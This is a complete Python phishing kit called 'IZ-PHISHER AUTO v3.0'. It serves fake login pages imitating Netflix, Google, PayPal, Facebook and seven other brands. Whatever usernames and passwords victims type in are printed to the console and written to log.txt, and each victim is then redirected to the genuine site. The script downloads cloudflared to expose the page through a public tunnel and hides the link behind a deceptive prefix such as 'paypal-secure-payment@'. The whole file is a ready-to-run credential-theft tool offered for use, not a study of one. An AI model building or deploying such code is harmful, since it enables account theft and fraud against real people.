#!/usr/bin/env python3
import os, sys, time, subprocess, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

# --- IZ COLOR PALETTE ---
R, G, W, Y, CY = '\033[91m', '\033[92m', '\033[0m', '\033[93m', '\033[96m'

BRANDS = {
    "1": {
        "name": "Netflix", 
        "mask": "netflix-login-verify",
        "bg": "https://assets.nflxext.com/ffe/siteui/vlv3/5e16109c-5030-493e-a06f-013144f80104/8f83196f-c1f3-4a0f-a38f-58f001c3493e/CL-es-20240219-popsignuptwoweeks-perspective_alpha_website_medium.jpg",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
        "color": "#e50914"
    },
    "2": {
        "name": "Spotify", 
        "mask": "spotify-premium-upgrade",
        "bg": "#000000",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_with_text.svg",
        "color": "#1DB954"
    },
    "3": {
        "name": "Facebook", 
        "mask": "facebook-secure-login",
        "bg": "#f0f2f5",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
        "color": "#1877f2"
    },
    "4": {
        "name": "Instagram", 
        "mask": "ig-verify-account",
        "bg": "#ffffff",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png",
        "color": "#E1306C"
    },
    "5": {
        "name": "Google", 
        "mask": "google-account-recovery",
        "bg": "#ffffff",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_\"G\"_logo.svg",
        "color": "#4285F4"
    },
    "6": {
        "name": "YouTube", 
        "mask": "youtube-channel-secure",
        "bg": "#ffffff",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg",
        "color": "#FF0000"
    },
    "7": {
        "name": "Steam", 
        "mask": "steam-community-login",
        "bg": "#1b2838",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg",
        "color": "#66c0f4"
    },
    "8": {
        "name": "Twitch", 
        "mask": "twitch-tv-partner",
        "bg": "#f7f7f8",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/d/d3/Twitch_Glitch_Logo_Purple.svg",
        "color": "#9146FF"
    },
    "9": {
        "name": "Twitter/X", 
        "mask": "x-blue-verification",
        "bg": "#000000",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_(white).svg",
        "color": "#ffffff"
    },
    "10": {
        "name": "PayPal", 
        "mask": "paypal-secure-payment",
        "bg": "#ffffff",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg",
        "color": "#003087"
    },
    "11": {
        "name": "Pinterest", 
        "mask": "pinterest-login-fix",
        "bg": "#ffffff",
        "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Pinterest-logo.png",
        "color": "#bd081c"
    }
}

SELECTED = BRANDS["1"]

class IZ_Engine(BaseHTTPRequestHandler):
    def log_message(self, format, *args): return

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        brand = SELECTED['name']
        logo = SELECTED['logo']
        color = SELECTED['color']
        bg = SELECTED['bg']
        
        # --- MODIFICACIÓN DE FONDO REAL ---
        if brand == "Netflix":
            bg_style = f"background-image: linear-gradient(to top, rgba(0, 0, 0, 0.8) 0%, rgba(0, 0, 0, 0.4) 60%, rgba(0, 0, 0, 0.8) 100%), url('{bg}'); background-size: cover; background-position: center;"
            box_bg = "rgba(0, 0, 0, 0.75)"
            text_color = "white"
        else:
            bg_style = f"background: {bg};"
            text_color = "white" if brand in ["Spotify", "Steam", "Twitter/X"] else "black"
            box_bg = "rgba(0,0,0,0.7)" if text_color == "white" else "white"
        
        border = "1px solid #ddd" if box_bg == "white" else "none"

        html = f"""<!DOCTYPE html><html><head><title>{brand} - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ {bg_style} margin: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; flex-direction: column; height: 100vh; color: {text_color}; }}
            .header {{ padding: 25px 50px; width: 100%; box-sizing: border-box; }}
            .logo {{ height: 45px; }}
            .login-box {{ background: {box_bg}; padding: 60px 68px 40px; border-radius: 4px; width: 100%; max-width: 450px; border: {border}; margin: 0 auto; box-sizing: border-box; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }}
            h1 {{ font-size: 32px; font-weight: 700; margin-bottom: 28px; }}
            input {{ width: 100%; padding: 16px 20px; margin-bottom: 16px; border-radius: 4px; border: none; background: #333; color: white; font-size: 16px; box-sizing: border-box; }}
            input[type="text"], input[type="password"] {{ background: { "white" if box_bg == "white" else "#333" }; color: { "black" if box_bg == "white" else "white" }; border: { "1px solid #8c8c8c" if box_bg == "white" else "none" }; }}
            .btn {{ width: 100%; padding: 16px; background: {color}; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 24px; }}
        </style></head><body>
            <div class="header"><img src="{logo}" class="logo"></div>
            <div class="login-box">
                <h1>Sign In</h1>
                <form method="POST">
                    <input type="text" name="u" placeholder="Email or phone number" required>
                    <input type="password" name="p" placeholder="Password" required>
                    <button type="submit" class="btn">Sign In</button>
                </form>
            </div>
        </body></html>"""
        self.wfile.write(html.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)
        user = params.get('u',[''])[0]
        password = params.get('p',[''])[0]
        
        print(f"\n{R}[!!!] {SELECTED['name'].upper()} DATA CAPTURED [!!!]{W}")
        print(f"{Y}USER: {G}{user}{W} | {Y}PASS: {G}{password}{W}")
        
        with open("log.txt", "a") as f:
            f.write(f"Site: {SELECTED['name']} | User: {user} | Pass: {password}\n")
        
        self.send_response(301)
        self.send_header('Location', f'https://www.{SELECTED["name"].lower()}.com')
        self.end_headers()

def loading_screen(brand_obj):
    os.system('clear')
    print(f"\n{R} ████  ███████      ████████  ███  ███  ███  ██████  ███  ███  ████████  ██████  ")
    print(f"░░███ ░░░░░███     ░███░░░███░███ ░███ ░███ ███░░███░███ ░███ ░███░░░░  ░███░░███ ")
    print(f" ░███    ███       ░████████ ░████████ ░███░░██████ ░████████ ░███████  ░██████   ")
    print(f" ░███   ███        ░███░░░░  ░███░░███ ░███ ░░░░░███░███░░███ ░███░░░░  ░███░░░███ ")
    print(f" ████  ███████     ░███      ░███ ░███ ░███ ███  ███░███ ░███ ░████████ ░███  ░███ {W}")
    print(f"\n    {W}---------------------------------------------------")
    print(f"    {CY}SELECTED MODULE: {G}{brand_obj['name'].upper()}")
    print(f"    {W}---------------------------------------------------\n")
    print(f"    {Y}[~] Generating encrypted tunnel for {brand_obj['name']}...{W}")
    
    animation = ["[■□□□□] 20%","[■■□□□] 40%","[■■■□□] 60%","[■■■■□] 80%","[■■■■■] 100%"]
    for step in animation:
        sys.stdout.write(f"\r    {G}{step}{W}")
        sys.stdout.flush()
        time.sleep(0.5)

def start_tunnel():
    if not os.path.exists("./cloudflared"):
        subprocess.run("wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared && chmod +x cloudflared", shell=True)
    proc = subprocess.Popen("./cloudflared tunnel --url http://localhost:8080", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(proc.stdout.readline, ""):
        if ".trycloudflare.com" in line:
            return "https://" + line.split("https://")[1].strip().split(" ")[0]

def brutal_banner():
    os.system('clear')
    print(f"\n{R} ████  ███████      ████████  ███  ███  ███  ██████  ███  ███  ████████  ██████  ")
    print(f"░░███ ░░░░░███     ░███░░░███░███ ░███ ░███ ███░░███░███ ░███ ░███░░░░  ░███░░███ ")
    print(f" ░███    ███       ░████████ ░████████ ░███░░██████ ░████████ ░███████  ░██████   ")
    print(f" ░███   ███        ░███░░░░  ░███░░███ ░███ ░░░░░███░███░░███ ░███░░░░  ░███░░░███ ")
    print(f" ████  ███████     ░███      ░███ ░███ ░███ ███  ███░███ ░███ ░████████ ░███  ░███ {W}")
    print(f"\n    {W}---------------------------------------------------")
    print(f"    {CY}DEVELOPED BY: {W}iz4cxz_by {R}|{W} {CY}IZ-PHISHER AUTO v3.0{W}")
    print(f"    {W}---------------------------------------------------\n")
    print(f"    {Y}Available Targets:{W}\n")
    for k, v in BRANDS.items():
        print(f"    [{k}] {v['name'].ljust(15)}", end="")
        if int(k) % 2 == 0: print("")
    print(f"\n\n    {W}---------------------------------------------------")

if __name__ == "__main__":
    brutal_banner()
    try:
        choice = input(f"    {CY}Select Target Number: {W}")
        if choice in BRANDS:
            SELECTED = BRANDS[choice]
            loading_screen(SELECTED)
            public_url = start_tunnel()
            masked_url = f"https://{SELECTED['mask']}@{public_url.replace('https://', '')}"
            print(f"\n\n    {G}[+] ATTACK IS LIVE!{W}")
            print(f"    {Y}[URL]: {W}{G}{masked_url}{W}")
            print(f"\n    {CY}[*] Waiting for credentials...{W}\n")
            HTTPServer(('', 8080), IZ_Engine).serve_forever()
    except KeyboardInterrupt:
        print(f"\n{R}[-] Stopping...{W}")
        subprocess.run("pkill cloudflared", shell=True)
